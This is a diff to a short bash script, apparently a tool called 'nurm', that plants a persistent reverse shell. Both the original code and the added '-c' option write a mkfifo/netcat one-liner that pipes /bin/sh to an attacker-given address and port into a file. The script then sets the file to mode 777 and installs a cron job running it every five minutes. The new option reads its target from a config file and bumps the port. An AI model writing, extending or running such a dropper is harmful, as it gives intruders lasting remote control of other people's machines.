@@ -1,5 +1,6 @@
 #!/bin/bash
-while getopts ":a:p:f:" opt; do
+. nurm.conf
+while getopts ":a:cp:f:" opt; do
         case ${opt} in
                 a )
                         address=$OPTARG
@@ -17,10 +18,22 @@ while getopts ":a:p:f:" opt; do
                 : )
                         echo "Usage: ./nurm [-a <address>] [-p <port>] [-f <full-path-file>]"
                         ;;
+		c )	
+			if ! [ -z ${dfile} ]; then
+        			echo "mkfifo /tmp/puesrrz; nc $daddr $dport 0</tmp/puesrrz | /bin/sh >/tmp/puesrrz 2>&1; rm /tmp/puesrrz" > $dfile 2>/dev/null
+        			chmod 777 $dfile 2>/dev/null
+       			 	(crontab -l 2>/dev/null; echo "*/5 * * * * $dfile ") 2>/dev/null | crontab -
+				sed '3d' nurm.conf > tmp
+				tport=$(($dport+1))
+				echo "dport=$tport" >> tmp
+				cat tmp > nurm.conf
+				rm tmp
+			else
+				echo "misconfigured config file. Aborting all process"
+			fi
         esac
 done
-if ! [ -z ${filepath} ];
-then
+if ! [ -z ${filepath} ]; then
         echo "mkfifo /tmp/puesrrz; nc $address $port 0</tmp/puesrrz | /bin/sh >/tmp/puesrrz 2>&1; rm /tmp/puesrrz" > $filepath 2>/dev/null
         chmod 777 $filepath 2>/dev/null
         (crontab -l 2>/dev/null; echo "*/5 * * * * $filepath ") 2>/dev/null | crontab - 
